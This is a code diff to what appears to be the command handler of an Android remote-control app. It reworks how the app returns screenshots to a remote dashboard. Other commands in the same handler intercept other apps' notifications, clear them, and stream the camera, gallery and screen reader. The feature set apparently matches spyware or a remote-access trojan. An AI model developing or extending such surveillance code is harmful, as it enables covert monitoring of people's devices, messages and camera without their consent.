@@ -1838,41 +1838,31 @@ public class SocketManager {
         if (command.equals("get_notifications_from_app")) return NotificationInterceptor.getNotificationsFromApp(params.getString("packageName"));
         if (command.equals("clear_notifications"))        return NotificationInterceptor.clearAllNotifications();
 
-        // ── Streaming — event-driven ─────────────────────────────────────
+        // ── Streaming — dashboard-timed one-shot screenshots ──────────────
         if (command.equals("stream_start")) {
-            // Read the interval the dashboard requests (100-5000ms; default 150ms).
-            final long requestedIntervalMs = Math.max(100L, params.optLong("intervalMs", 150L));
-            final String deviceId = DeviceInfo.getDeviceId(context);
-            // Serialize setup through heartbeatExecutor (single-threaded) so that a
-            // stream_stop submitted just before this cannot arrive *after* we start.
-            heartbeatExecutor.execute(() -> {
-                // Feature mutex: stop camera stream and gallery before starting screen stream
-                if (cameraStreamHandler.isStreaming()) cameraStreamHandler.stopStream();
-                galleryStopFlag.set(true);
-                activeFeature = "screen";
-                startIdleFrameMode(deviceId, requestedIntervalMs);
-                // Do NOT call sendSingleFrame here — first frame is already in-flight
-                // on the capture executor (dispatched below, before this task was queued).
-            });
-            // Dispatch the first frame capture directly to the capture executor RIGHT NOW —
-            // do not wait for heartbeatExecutor to dequeue the setup lambda above.
-            // This eliminates the "setup queue" delay so the first screenshot starts
-            // arriving within one captureScreenSync() call (~100-500ms) instead of
-            // waiting for heartbeatExecutor + captureScreenSync() in sequence.
-            sendSingleFrame(deviceId);
-            JSONObject r = new JSONObject();
-            r.put("success", true);
-            r.put("message", "Stream started — push interval " + requestedIntervalMs + "ms");
+            // The dashboard owns the polling interval.  Keep this command
+            // request/response based so every result contains the screenshot
+            // that was taken for that exact tick; do not start a background
+            // stream or return only "stream started".
+            // Stop any legacy push mode left by an older dashboard session.
+            stopIdleFrameMode();
+            stopBlockFrameMode();
+            JSONObject r = screenshotHandler.takeScreenshot();
+            long requestedIntervalMs = Math.max(500L, Math.min(
+                    10_000L, params.optLong("intervalMs", 1_000L)));
+            r.put("streaming", true);
+            r.put("streamStarted", true);
+            r.put("intervalMs", requestedIntervalMs);
+            r.put("message", "Screenshot captured");
             return r;
         }
         if (command.equals("stream_stop")) {
-            heartbeatExecutor.execute(() -> {
-                stopIdleFrameMode();
-                stopBlockFrameMode();
-            });
+            // Also clean up push modes created by older APK/dashboard pairs.
+            stopIdleFrameMode();
+            stopBlockFrameMode();
             JSONObject r = new JSONObject();
             r.put("success", true);
-            r.put("message", "Stream stopped");
+            r.put("message", "Screenshot requests stopped");
             return r;
         }
         if (command.equals("stream_request_frame")) {
@@ -2375,6 +2365,8 @@ public class SocketManager {
             case "screen_reader_stop":
             case "screen_reader_stream_start":
             case "screen_reader_stream_stop":
+            case "stream_start":
+            case "stream_stop":
             case "take_screenshot":
             case "list_screen_recordings":
             case "get_screen_recording":
